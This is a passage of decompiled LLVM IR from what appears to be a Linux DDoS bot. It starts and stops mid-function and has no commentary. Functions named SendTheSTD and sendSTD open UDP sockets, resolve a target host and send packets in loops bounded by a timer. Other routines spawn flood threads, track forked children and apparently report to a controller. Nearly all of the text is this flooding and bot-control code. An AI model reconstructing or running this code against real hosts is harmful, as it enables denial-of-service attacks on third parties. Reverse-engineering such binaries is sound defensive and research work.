  %v1_804cd97 = icmp eq i1 %v1_804cd95, false
  %v2_804ce0b = call i32 @malloc(i32 24)
  store i32 %v2_804ce0b, i32* %eax.global-to-local, align 4
  br i1 %v1_804cd97, label %dec_label_pc_804ce06, label %dec_label_pc_804cd99

dec_label_pc_804cd99:                             ; preds = %dec_label_pc_804cd6b
  store i32 %v2_804ce0b, i32* @global_var_807dca0.85, align 32
  store i32 %v2_804ce0b, i32* %eax.global-to-local, align 4
  %v1_804cdb0 = inttoptr i32 %v2_804ce0b to i32*
  store i32 0, i32* %v1_804cdb0, align 4
  %v0_804cdb6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cdb6 = add i32 %v0_804cdb6, 4
  %v2_804cdb6 = inttoptr i32 %v1_804cdb6 to i32*
  store i32 0, i32* %v2_804cdb6, align 4
  %v0_804cdbd = load i32, i32* %eax.global-to-local, align 4
  %v1_804cdbd = add i32 %v0_804cdbd, 8
  %v2_804cdbd = inttoptr i32 %v1_804cdbd to i32*
  store i32 0, i32* %v2_804cdbd, align 4
  %v0_804cdc4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cdc4 = add i32 %v0_804cdc4, 12
  %v2_804cdc4 = inttoptr i32 %v1_804cdc4 to i32*
  store i32 0, i32* %v2_804cdc4, align 4
  %v0_804cdcb = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804cdcb, i32* @ebx, align 4
  %v2_804cdd7 = call i32 @inet_addr(i32 %v5_804cc59)
  %v1_804cddf = load i32, i32* @ebx, align 4
  %v2_804cddf = add i32 %v1_804cddf, 4
  %v3_804cddf = inttoptr i32 %v2_804cddf to i32*
  store i32 %v2_804cdd7, i32* %v3_804cddf, align 4
  %v0_804cde2 = load i32, i32* @global_var_807dca0.85, align 32
  %v2_804cded = add i32 %v0_804cde2, 532
  %v3_804cded = inttoptr i32 %v2_804cded to i32*
  store i32 %v0_804cde2, i32* %v3_804cded, align 4
  %v0_804cdf3 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804cdf3, i32* @edx, align 4
  store i32 %v0_804cdf3, i32* %eax.global-to-local, align 4
  %v2_804cdfe = add i32 %v0_804cdf3, 536
  %v3_804cdfe = inttoptr i32 %v2_804cdfe to i32*
  store i32 %v0_804cdf3, i32* %v3_804cdfe, align 4
  br label %dec_label_pc_804ce6a

dec_label_pc_804ce06:                             ; preds = %dec_label_pc_804cd6b
  %v8_804ce1d = inttoptr i32 %v2_804ce0b to i8*
  %v5_804ce20 = call i32 @__GI_memset(i8* %v8_804ce1d, i32 0, i32 24)
  store i32 %v5_804ce20, i32* %eax.global-to-local, align 4
  %v2_804ce2e = call i32 @inet_addr(i32 %v5_804cc59)
  %v2_804ce3b = add i32 %v2_804ce0b, 4
  %v3_804ce3b = inttoptr i32 %v2_804ce3b to i32*
  store i32 %v2_804ce2e, i32* %v3_804ce3b, align 4
  %v0_804ce3e = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804ce3e, i32* %edx.global-to-local, align 4
  %v2_804ce47 = add i32 %v2_804ce0b, 20
  %v3_804ce47 = inttoptr i32 %v2_804ce47 to i32*
  store i32 %v0_804ce3e, i32* %v3_804ce47, align 4
  %v0_804ce4a = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804ce4a, i32* %eax.global-to-local, align 4
  %v1_804ce4f = add i32 %v0_804ce4a, 532
  %v2_804ce4f = inttoptr i32 %v1_804ce4f to i32*
  %v3_804ce4f = load i32, i32* %v2_804ce4f, align 4
  %v2_804ce58 = add i32 %v2_804ce0b, 16
  %v3_804ce58 = inttoptr i32 %v2_804ce58 to i32*
  store i32 %v3_804ce4f, i32* %v3_804ce58, align 4
  %v0_804ce5b = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804ce5b, i32* @edx, align 4
  store i32 %v2_804ce0b, i32* %eax.global-to-local, align 4
  %v2_804ce64 = add i32 %v0_804ce5b, 532
  %v3_804ce64 = inttoptr i32 %v2_804ce64 to i32*
  store i32 %v2_804ce0b, i32* %v3_804ce64, align 4
  br label %dec_label_pc_804ce6a

dec_label_pc_804ce6a:                             ; preds = %dec_label_pc_804cd99, %dec_label_pc_804ce06
  br label %dec_label_pc_804ce6d.outer

dec_label_pc_804ce6d.outer:                       ; preds = %dec_label_pc_804ce6a, %dec_label_pc_804cbf3
  br label %dec_label_pc_804ce6d

dec_label_pc_804ce6d:                             ; preds = %dec_label_pc_804ce6d.outer, %dec_label_pc_804cd3f
  %v4_804ce79 = call i32 @fgets(i32 %v5_804cc59, i32 128, i32 %v3_804cd07)
  store i32 %v4_804ce79, i32* %eax.global-to-local, align 4
  %v1_804ce81 = icmp eq i32 %v4_804ce79, 0
  %v1_804ce83 = icmp eq i1 %v1_804ce81, false
  br i1 %v1_804ce83, label %dec_label_pc_804cd17, label %dec_label_pc_804ce89

dec_label_pc_804ce89:                             ; preds = %dec_label_pc_804ce6d
  %v0_804ce89 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_804ce89, i32* %eax.global-to-local, align 4
  %v1_804ce8e = add i32 %v0_804ce89, 532
  %v2_804ce8e = inttoptr i32 %v1_804ce8e to i32*
  %v3_804ce8e = load i32, i32* %v2_804ce8e, align 4
  %v2_804ce9a = mul i32 %v2_804cc70, 4
  %v1_804cea0 = add i32 %v2_804ce9a, 30
  %v2_804cea3 = and i32 %v1_804cea0, -16
  %v2_804cea9 = sub i32 %v7_804cb92, %v2_804cea3
  %v1_804ceb7 = add i32 %v2_804cea9, 15
  %v2_804ceba = and i32 %v1_804ceb7, -16
  %v1_804cedb = add i32 %arg4, 4
  store i32 %v1_804cedb, i32* %eax.global-to-local, align 4
  %v1_804cede = inttoptr i32 %v1_804cedb to i32*
  %v2_804cede = load i32, i32* %v1_804cede, align 4
  store i32 %v2_804cede, i32* %eax.global-to-local, align 4
  %v2_804cee3 = add i32 %v2_804cea9, -16
  %v3_804cee3 = inttoptr i32 %v2_804cee3 to i32*
  store i32 %v2_804cede, i32* %v3_804cee3, align 4
  %v1_804cee4 = call i32 @inet_addr(i32 %v2_804ceba)
  %v0_804cee9 = load i32, i32* @esp, align 4
  %v1_804cee9 = add i32 %v0_804cee9, 16
  store i32 %v2_804cc70, i32* %edx.global-to-local, align 4
  %v2_804cefd = mul i32 %v2_804cc70, 24
  %v1_804cf03 = add i32 %v2_804cefd, 30
  %v2_804cf06 = and i32 %v1_804cf03, -16
  %v2_804cf0c = sub i32 %v1_804cee9, %v2_804cf06
  %v1_804cf1a = add i32 %v2_804cf0c, 15
  %v2_804cf1d = and i32 %v1_804cf1a, -16
  store i32 %v2_804cf1d, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804cfe371 = icmp sgt i32 %v2_804cc70, 0
  br i1 %v5_804cfe371, label %dec_label_pc_804cf3e.lr.ph, label %dec_label_pc_804cfe9

dec_label_pc_804cf3e.lr.ph:                       ; preds = %dec_label_pc_804ce89
  %v3_804cf70 = or i32 %v2_804cf1d, 8
  br label %dec_label_pc_804cf3e

dec_label_pc_804cf3e:                             ; preds = %dec_label_pc_804cf3e, %dec_label_pc_804cf3e.lr.ph
  %storemerge572 = phi i32 [ 0, %dec_label_pc_804cf3e.lr.ph ], [ %v4_804cfda, %dec_label_pc_804cf3e ]
  %v1_804cf4a = mul i32 %storemerge572, 24
  %v3_804cf54 = add i32 %v1_804cf4a, %v2_804cf1d
  %v4_804cf54 = inttoptr i32 %v3_804cf54 to i32*
  store i32 %storemerge572, i32* %v4_804cf54, align 8
  store i32 %v2_804cf1d, i32* %ecx.global-to-local, align 4
  store i32 %v1_804cf4a, i32* %edx.global-to-local, align 4
  %v4_804cf70 = add i32 %v3_804cf70, %v1_804cf4a
  %v5_804cf70 = inttoptr i32 %v4_804cf70 to i32*
  store i32 2, i32* %v5_804cf70, align 8
  %v1_804cf7a = load i32, i32* %edx.global-to-local, align 4
  %v2_804cf7a = load i32, i32* %ecx.global-to-local, align 4
  %v3_804cf7a = add i32 %v1_804cf7a, 12
  %v4_804cf7a = add i32 %v3_804cf7a, %v2_804cf7a
  %v5_804cf7a = inttoptr i32 %v4_804cf7a to i32*
  store i32 %v1_804cee4, i32* %v5_804cf7a, align 4
  %v1_804cf84 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cf84 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804cf84 = add i32 %v1_804cf84, 16
  %v4_804cf84 = add i32 %v3_804cf84, %v2_804cf84
  %v5_804cf84 = inttoptr i32 %v4_804cf84 to i32*
  %v1_804cf8e = load i32, i32* %edx.global-to-local, align 4
  %v2_804cf8e = load i32, i32* %ecx.global-to-local, align 4
  %v3_804cf8e = add i32 %v1_804cf8e, 20
  %v4_804cf8e = add i32 %v3_804cf8e, %v2_804cf8e
  %v5_804cf8e = inttoptr i32 %v4_804cf8e to i32*
  %v3_804cfa8 = or i32 %v1_804cf4a, 4
  %v4_804cfa8 = add i32 %v3_804cfa8, %v2_804cf1d
  %v5_804cfa8 = inttoptr i32 %v4_804cfa8 to i32*
  store i32 %v3_804ce8e, i32* %v5_804cfa8, align 4
  store i32 %v3_804cf54, i32* @ecx, align 4
  store i32 %v2_804ceba, i32* %edx.global-to-local, align 4
  %v2_804cfc3 = mul i32 %storemerge572, 4
  %v2_804cfc6 = add i32 %v2_804cfc3, %v2_804ceba
  store i32 %v2_804cfc6, i32* %eax.global-to-local, align 4
  %v1_804cfc9 = load i32, i32* @esp, align 4
  %v2_804cfc9 = add i32 %v1_804cfc9, -4
  %v3_804cfc9 = inttoptr i32 %v2_804cfc9 to i32*
  store i32 %v3_804cf54, i32* %v3_804cfc9, align 4
  %v1_804cfca = add i32 %v1_804cfc9, -8
  %v2_804cfca = inttoptr i32 %v1_804cfca to i32*
  store i32 134531327, i32* %v2_804cfca, align 4
  %v1_804cfcf = add i32 %v1_804cfc9, -12
  %v2_804cfcf = inttoptr i32 %v1_804cfcf to i32*
  store i32 0, i32* %v2_804cfcf, align 4
  %v0_804cfd1 = load i32, i32* %eax.global-to-local, align 4
  %v2_804cfd1 = add i32 %v1_804cfc9, -16
  %v3_804cfd1 = inttoptr i32 %v2_804cfd1 to i32*
  store i32 %v0_804cfd1, i32* %v3_804cfd1, align 4
  %v4_804cfd2 = inttoptr i32 %storemerge572 to i32*
  %v5_804cfd2 = call i32 @pthread_create(i32* %v4_804cfd2, i32 128, i32 %v5_804cc59, i32 %v2_804cc70)
  %v0_804cfd7 = load i32, i32* @esp, align 4
  %v1_804cfd7 = add i32 %v0_804cfd7, 16
  %v4_804cfda = add nuw nsw i32 %storemerge572, 1
  store i32 %v4_804cfda, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804cfda, %v2_804cc70
  br i1 %exitcond, label %dec_label_pc_804cfe9, label %dec_label_pc_804cf3e

dec_label_pc_804cfe9:                             ; preds = %dec_label_pc_804cf3e, %dec_label_pc_804ce89
  %v0_804cff9.lcssa = phi i32 [ %v2_804cf0c, %dec_label_pc_804ce89 ], [ %v1_804cfd7, %dec_label_pc_804cf3e ]
  %storemerge5.lcssa = phi i32 [ 0, %dec_label_pc_804ce89 ], [ %v2_804cc70, %dec_label_pc_804cf3e ]
  %v1_804cfec = add i32 %arg4, 8
  store i32 %v1_804cfec, i32* %eax.global-to-local, align 4
  %v1_804cfef = inttoptr i32 %v1_804cfec to i32*
  %v2_804cfef = load i32, i32* %v1_804cfef, align 4
  store i32 %v2_804cfef, i32* %edx.global-to-local, align 4
  store i32 %v1_804cedb, i32* %eax.global-to-local, align 4
  %v2_804cff7 = load i32, i32* %v1_804cede, align 4
  store i32 %v2_804cff7, i32* %eax.global-to-local, align 4
  %v2_804cffc = add i32 %v0_804cff9.lcssa, -16
  %v3_804cffc = inttoptr i32 %v2_804cffc to i32*
  store i32 %v2_804cfef, i32* %v3_804cffc, align 4
  %v0_804cffd = load i32, i32* %eax.global-to-local, align 4
  %v2_804cffd = add i32 %v0_804cff9.lcssa, -20
  %v3_804cffd = inttoptr i32 %v2_804cffd to i32*
  store i32 %v0_804cffd, i32* %v3_804cffd, align 4
  %v5_804cffe = add i32 %v0_804cff9.lcssa, -24
  %v6_804cffe = inttoptr i32 %v5_804cffe to i32*
  store i32 %arg2, i32* %v6_804cffe, align 4
  %v1_804d001 = add i32 %v0_804cff9.lcssa, -28
  %v2_804d001 = inttoptr i32 %v1_804d001 to i32*
  store i32 ptrtoint ([39 x i8]* @global_var_8069a28.182 to i32), i32* %v2_804d001, align 4
  %v5_804d006 = add i32 %v0_804cff9.lcssa, -32
  %v6_804d006 = inttoptr i32 %v5_804d006 to i32*
  store i32 %arg1, i32* %v6_804d006, align 4
  %v2_804d009 = call i32 @Send(i32 %storemerge5.lcssa, i32 128)
  %v0_804d00e = load i32, i32* @esp, align 4
  %v0_804d011 = load i8*, i8** @global_var_8073d6c, align 4
  %v1_804d011 = ptrtoint i8* %v0_804d011 to i32
  store i32 %v1_804d011, i32* %eax.global-to-local, align 4
  %v2_804d016 = add i32 %v0_804d00e, 28
  %v3_804d016 = inttoptr i32 %v2_804d016 to i32*
  store i32 %v1_804d011, i32* %v3_804d016, align 4
  %v1_804d017 = add i32 %v0_804d00e, 24
  %v2_804d017 = inttoptr i32 %v1_804d017 to i32*
  store i32 29, i32* %v2_804d017, align 4
  %v1_804d019 = add i32 %v0_804d00e, 20
  %v2_804d019 = inttoptr i32 %v1_804d019 to i32*
  store i32 1, i32* %v2_804d019, align 4
  %v1_804d01b = add i32 %v0_804d00e, 16
  %v2_804d01b = inttoptr i32 %v1_804d01b to i32*
  store i32 ptrtoint ([30 x i8]* @global_var_8069a4f.183 to i32), i32* %v2_804d01b, align 4
  %v4_804d020 = call i32 @fwrite(i32 %storemerge5.lcssa, i32 128, i32 %v5_804cc59, i32 %v2_804cc70)
  store i32 %v4_804d020, i32* %eax.global-to-local, align 4
  %v0_804d025 = load i32, i32* @esp, align 4
  %v1_804d0e1 = add i32 %arg4, 24
  %v1_804d0e4 = inttoptr i32 %v1_804d0e1 to i32*
  br label %dec_label_pc_804d0de

dec_label_pc_804d034:                             ; preds = %dec_label_pc_804d0de
  store i32 5000, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v3_804d062 = inttoptr i32 %v0_804d0ef to i32*
  store i32 50000, i32* %v3_804d062, align 4
  %v1_804d063 = sext i32 %storemerge to i64
  %v2_804d063 = call i32 @usleep(i64 %v1_804d063)
  %v0_804d068 = load i32, i32* @esp, align 4
  %v0_804d06b = load i64, i64* @global_var_807cc80.96, align 8
  %sext = mul i64 %v0_804d06b, 4294967296
  %v2_804d074 = sdiv i64 %sext, 4294967296
  %v4_804d074 = mul nsw i64 %v2_804d074, 20
  %v5_804d074 = trunc i64 %v4_804d074 to i32
  store i32 %v5_804d074, i32* %edx.global-to-local, align 4
  %tmp = icmp ugt i32 %v5_804d074, %v2_804cc87
  %v0_804d0a3 = load i32, i32* @global_var_807cb68.97, align 8
  store i32 %v0_804d0a3, i32* %eax.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_804d07e, label %dec_label_pc_804d0a3

dec_label_pc_804d07e:                             ; preds = %dec_label_pc_804d034
  %tmp64 = icmp slt i32 %v0_804d0a3, 1
  %tmp65 = icmp eq i1 %tmp64, false
  br i1 %tmp65, label %dec_label_pc_804d096, label %dec_label_pc_804d087

dec_label_pc_804d087:                             ; preds = %dec_label_pc_804d07e
  %v0_804d087 = load i32, i32* @global_var_806f718.98, align 8
  %v1_804d08c = add i32 %v0_804d087, 100
  store i32 %v1_804d08c, i32* %eax.global-to-local, align 4
  store i32 %v1_804d08c, i32* @global_var_806f718.98, align 8
  br label %dec_label_pc_804d0d1

dec_label_pc_804d096:                             ; preds = %dec_label_pc_804d07e
  %v1_804d09b = add i32 %v0_804d0a3, -1
  store i32 %v1_804d09b, i32* %eax.global-to-local, align 4
  store i32 %v1_804d09b, i32* @global_var_807cb68.97, align 8
  br label %dec_label_pc_804d0d1

dec_label_pc_804d0a3:                             ; preds = %dec_label_pc_804d034
  %v1_804d0a8 = add i32 %v0_804d0a3, 1
  store i32 %v1_804d0a8, i32* @global_var_807cb68.97, align 8
  %v0_804d0ae = load i32, i32* @global_var_806f718.98, align 8
  store i32 %v0_804d0ae, i32* %eax.global-to-local, align 4
  %v1_804d0b3 = add i32 %v0_804d0ae, -25
  %v5_804d0b3 = icmp ult i32 %v0_804d0ae, 25
  %v9_804d0b3 = icmp eq i32 %v1_804d0b3, 0
  %v2_804d0b6 = or i1 %v5_804d0b3, %v9_804d0b3
  br i1 %v2_804d0b6, label %dec_label_pc_804d0c7, label %dec_label_pc_804d0b8

dec_label_pc_804d0b8:                             ; preds = %dec_label_pc_804d0a3
  store i32 %v1_804d0b3, i32* %eax.global-to-local, align 4
  store i32 %v1_804d0b3, i32* @global_var_806f718.98, align 8
  br label %dec_label_pc_804d0d1

dec_label_pc_804d0c7:                             ; preds = %dec_label_pc_804d0a3
  store i32 0, i32* @global_var_806f718.98, align 8
  br label %dec_label_pc_804d0d1

dec_label_pc_804d0d1:                             ; preds = %dec_label_pc_804d0b8, %dec_label_pc_804d096, %dec_label_pc_804d087, %dec_label_pc_804d0c7
  store i64 0, i64* @global_var_807cc80.96, align 128
  %v4_804d0db = add i32 %storemerge, 1
  br label %dec_label_pc_804d0de

dec_label_pc_804d0de:                             ; preds = %dec_label_pc_804cfe9, %dec_label_pc_804d0d1
  %v0_804d0e6.in = phi i32 [ %v0_804d068, %dec_label_pc_804d0d1 ], [ %v0_804d025, %dec_label_pc_804cfe9 ]
  %storemerge = phi i32 [ %v4_804d0db, %dec_label_pc_804d0d1 ], [ 0, %dec_label_pc_804cfe9 ]
  store i32 %v1_804d0e1, i32* %eax.global-to-local, align 4
  %v2_804d0e4 = load i32, i32* %v1_804d0e4, align 4
  store i32 %v2_804d0e4, i32* %eax.global-to-local, align 4
  %v3_804d0e9 = inttoptr i32 %v0_804d0e6.in to i32*
  store i32 %v2_804d0e4, i32* %v3_804d0e9, align 4
  %v1_804d0ea = call i32 @atol(i32 %storemerge)
  %v0_804d0ef = load i32, i32* @esp, align 4
  %v9_804d0f2 = mul i32 %v1_804d0ea, 20
  store i32 %v9_804d0f2, i32* %eax.global-to-local, align 4
  %v8_804d0f9 = icmp sgt i32 %v9_804d0f2, %storemerge
  br i1 %v8_804d0f9, label %dec_label_pc_804d034, label %dec_label_pc_804d0ff

dec_label_pc_804d0ff:                             ; preds = %dec_label_pc_804d0de, %entry
  %v0_804d10c = phi i32 [ %v1_804cb95, %entry ], [ %v9_804d0f2, %dec_label_pc_804d0de ]
  ret i32 %v0_804d10c

; uselistorder directives
  uselistorder i32 %v9_804d0f2, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 2, 3, 1, 0 }
  uselistorder i32 %v1_804d0b3, { 1, 0, 2 }
  uselistorder i32 %v0_804d0a3, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804d0e1, { 1, 0 }
  uselistorder i32 %storemerge5.lcssa, { 1, 0 }
  uselistorder i32 %v3_804cf54, { 1, 0, 2 }
  uselistorder i32 %v1_804cf4a, { 2, 0, 3, 1 }
  uselistorder i32 %storemerge572, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v2_804cf1d, { 3, 1, 2, 4, 0 }
  uselistorder i32 %v2_804ceba, { 0, 2, 1 }
  uselistorder i32 %v0_804cdf3, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804cde2, { 1, 0 }
  uselistorder i32 %v2_804ce0b, { 1, 0, 2, 3, 4, 5, 8, 7, 6, 9 }
  uselistorder i32 %v2_804cc70, { 5, 0, 1, 6, 2, 4, 7, 3 }
  uselistorder i32 %v5_804cc59, { 3, 4, 11, 7, 6, 8, 1, 5, 2, 0, 9, 10 }
  uselistorder i32 %v4_804cbcd, { 1, 0 }
  uselistorder i32* %stack_var_-636, { 0, 1, 3, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 7, 8, 9, 1, 2, 4, 5, 3, 6, 10, 11, 12, 13, 14, 15, 18, 16, 17, 0, 19, 20, 21, 39, 22, 23, 24, 26, 27, 28, 29, 30, 25, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i64* @global_var_807cc80.96, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_807cb68.97, { 0, 2, 1, 3, 4, 5, 7, 6, 8, 9, 10, 12, 11, 13, 14 }
  uselistorder i32 (i32, i32, i32, i32)* @fwrite, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d0de, { 1, 0 }
  uselistorder label %dec_label_pc_804d0d1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ce6a, { 1, 0 }
  uselistorder label %dec_label_pc_804cbf3, { 1, 0 }
  uselistorder label %dec_label_pc_804cbcd, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804d10d = load i32, i32* @ebp, align 4
  store i32 %v0_804d10d, i32* %stack_var_-4, align 4
  %v4_804d10d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804d10d, i32* @ebp, align 4
  %v1_804d113 = call i32 @fork(i32 %v0_804d10d)
  %v4_804d11b = icmp eq i32 %v1_804d113, 0
  %v1_804d11f = icmp eq i1 %v4_804d11b, false
  br i1 %v1_804d11f, label %dec_label_pc_804d12c, label %dec_label_pc_804d1b9

dec_label_pc_804d12c:                             ; preds = %entry
  %v0_804d12c = load i32, i32* @global_var_807407c.31, align 4
  %v1_804d131 = add i32 %v0_804d12c, 1
  store i32 %v1_804d131, i32* @global_var_807407c.31, align 4
  %v2_804d13c = mul i32 %v1_804d131, 4
  %v1_804d13f = add i32 %v2_804d13c, 4
  %v1_804d146 = call i32 @malloc(i32 %v1_804d13f)
  %v0_804d17c11 = load i32, i32* @global_var_807407c.31, align 4
  %v6_804d18513 = icmp eq i32 %v0_804d17c11, 1
  br i1 %v6_804d18513, label %dec_label_pc_804d187, label %dec_label_pc_804d15a

dec_label_pc_804d15a:                             ; preds = %dec_label_pc_804d12c, %dec_label_pc_804d15a
  %storemerge114 = phi i32 [ %v4_804d179, %dec_label_pc_804d15a ], [ 0, %dec_label_pc_804d12c ]
  %v2_804d15d = mul i32 %storemerge114, 4
  %v5_804d162 = add i32 %v2_804d15d, %v1_804d146
  store i32 %v5_804d162, i32* @ecx, align 4
  %v0_804d16d = load i32, i32* @global_var_807e0fc.32, align 4
  %v2_804d172 = add i32 %v0_804d16d, %v2_804d15d
  %v1_804d175 = inttoptr i32 %v2_804d172 to i32*
  %v2_804d175 = load i32, i32* %v1_804d175, align 4
  %v2_804d177 = inttoptr i32 %v5_804d162 to i32*
  store i32 %v2_804d175, i32* %v2_804d177, align 4
  %v4_804d179 = add i32 %storemerge114, 1
  %v0_804d17c = load i32, i32* @global_var_807407c.31, align 4
  %v1_804d181 = add i32 %v0_804d17c, -1
  %v6_804d185 = icmp ugt i32 %v1_804d181, %v4_804d179
  br i1 %v6_804d185, label %dec_label_pc_804d15a, label %dec_label_pc_804d187

dec_label_pc_804d187:                             ; preds = %dec_label_pc_804d15a, %dec_label_pc_804d12c
  %v0_804d17c.lcssa = phi i32 [ %v0_804d17c11, %dec_label_pc_804d12c ], [ %v0_804d17c, %dec_label_pc_804d15a ]
  %v2_804d18c = mul i32 %v0_804d17c.lcssa, 4
  %v5_804d18f = add i32 %v1_804d146, -4
  %v1_804d192 = add i32 %v5_804d18f, %v2_804d18c
  %v2_804d198 = inttoptr i32 %v1_804d192 to i32*
  store i32 %v1_804d113, i32* %v2_804d198, align 4
  %v0_804d19a = load i32, i32* @global_var_807e0fc.32, align 4
  %v1_804d1a3 = call i32 @free(i32 %v0_804d19a)
  store i32 %v1_804d146, i32* @global_var_807e0fc.32, align 4
  br label %dec_label_pc_804d1b9

dec_label_pc_804d1b9:                             ; preds = %entry, %dec_label_pc_804d187
  %v2_804d1bc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d1bc, i32* @ebp, align 4
  ret i32 %v1_804d113

; uselistorder directives
  uselistorder i32 %v4_804d179, { 1, 0 }
  uselistorder i32 %v2_804d15d, { 1, 0 }
  uselistorder i32 %storemerge114, { 1, 0 }
  uselistorder i32 %v0_804d17c11, { 1, 0 }
  uselistorder i32 %v1_804d146, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d1b9, { 1, 0 }
  uselistorder label %dec_label_pc_804d15a, { 1, 0 }
}

define i32 @SendTheSTD(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v4_804d1cd = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804d1dd = call i32 @__GI_time(i32* null)
  %v1_804d1ef = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804d1fa = ptrtoint i32* %stack_var_-36 to i32
  store i32 0, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-32, align 4
  %v1_804d21b = add i32 %v1_804d1ef, 12
  %v2_804d21b = inttoptr i32 %v1_804d21b to i32*
  %v3_804d21b = load i32, i32* %v2_804d21b, align 4
  %v2_804d223 = ptrtoint i32* %stack_var_-32 to i32
  %v1_804d229 = add i32 %v1_804d1ef, 16
  %v2_804d229 = inttoptr i32 %v1_804d229 to i32*
  %v3_804d229 = load i32, i32* %v2_804d229, align 4
  %v1_804d22c = inttoptr i32 %v3_804d229 to i32*
  %v2_804d22c = load i32, i32* %v1_804d22c, align 4
  %v4_804d234 = call i32 @bcopy(i32 %v2_804d22c, i32 %v2_804d223, i32 %v3_804d21b)
  %v1_804d23f = add i32 %v1_804d1ef, 8
  %v2_804d23f = inttoptr i32 %v1_804d23f to i32*
  %v3_804d23f = load i32, i32* %v2_804d23f, align 4
  store i32 %v3_804d23f, i32* %stack_var_-36, align 4
  %v5_804d292 = add i32 %v2_804d1dd, %arg3
  br label %dec_label_pc_804d254

dec_label_pc_804d254:                             ; preds = %dec_label_pc_804d2a0, %entry
  %storemerge = phi i32 [ %v4_804d2a0, %dec_label_pc_804d2a0 ], [ 0, %entry ]
  %v5_804d260 = call i32 @send(i32 %v4_804d1cd, i32 ptrtoint ([4 x i8]* @global_var_8069a6d.184 to i32), i32 69, i32 0)
  %v4_804d274 = call i32 @connect(i32 %v4_804d1cd, i32 %v2_804d1fa, i32 16)
  %v7_804d280 = icmp sgt i32 %storemerge, 99
  br i1 %v7_804d280, label %dec_label_pc_804d282, label %dec_label_pc_804d2a0

dec_label_pc_804d282:                             ; preds = %dec_label_pc_804d254
  %v2_804d287 = call i32 @__GI_time(i32* null)
  %v5_804d297 = icmp slt i32 %v2_804d287, %v5_804d292
  br i1 %v5_804d297, label %dec_label_pc_804d2a0, label %dec_label_pc_804d2a5

dec_label_pc_804d2a0:                             ; preds = %dec_label_pc_804d282, %dec_label_pc_804d254
  %stack_var_-8.0 = phi i32 [ %storemerge, %dec_label_pc_804d254 ], [ 0, %dec_label_pc_804d282 ]
  %v4_804d2a0 = add i32 %stack_var_-8.0, 1
  br label %dec_label_pc_804d254

dec_label_pc_804d2a5:                             ; preds = %dec_label_pc_804d282
  ret i32 %v2_804d287

; uselistorder directives
  uselistorder i32 %v1_804d1ef, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804d2b3 = call i32 @mfork(i32 %arg2)
  %v1_804d2bb = icmp eq i32 %v1_804d2b3, 0
  %v1_804d2bd = icmp eq i1 %v1_804d2bb, false
  br i1 %v1_804d2bd, label %dec_label_pc_804d419, label %dec_label_pc_804d2c3

dec_label_pc_804d2c3:                             ; preds = %entry
  %v4_804d2c3 = add i32 %arg3, -2
  %v9_804d2c3 = sub i32 1, %arg3
  %v10_804d2c3 = and i32 %v9_804d2c3, %arg3
  %v11_804d2c3 = icmp slt i32 %v10_804d2c3, 0
  %v12_804d2c3 = icmp eq i32 %v4_804d2c3, 0
  %v13_804d2c3 = icmp slt i32 %v4_804d2c3, 0
  %v3_804d2c7 = icmp eq i1 %v13_804d2c3, %v11_804d2c3
  %v4_804d2c7 = icmp eq i1 %v12_804d2c3, false
  %v5_804d2c7 = and i1 %v4_804d2c7, %v3_804d2c7
  br i1 %v5_804d2c7, label %dec_label_pc_804d2e9, label %dec_label_pc_804d2c9

dec_label_pc_804d2c9:                             ; preds = %dec_label_pc_804d2c3
  %v2_804d2d7 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_8069a74.185 to i32))
  %v1_804d2e4 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804d2e9

dec_label_pc_804d2e9:                             ; preds = %dec_label_pc_804d2c3, %dec_label_pc_804d2c9
  %v1_804d2ec = add i32 %arg4, 4
  %v1_804d2ef = inttoptr i32 %v1_804d2ec to i32*
  %v2_804d2ef = load i32, i32* %v1_804d2ef, align 4
  %v1_804d2f7 = add i32 %arg4, 8
  %v1_804d2fa = inttoptr i32 %v1_804d2f7 to i32*
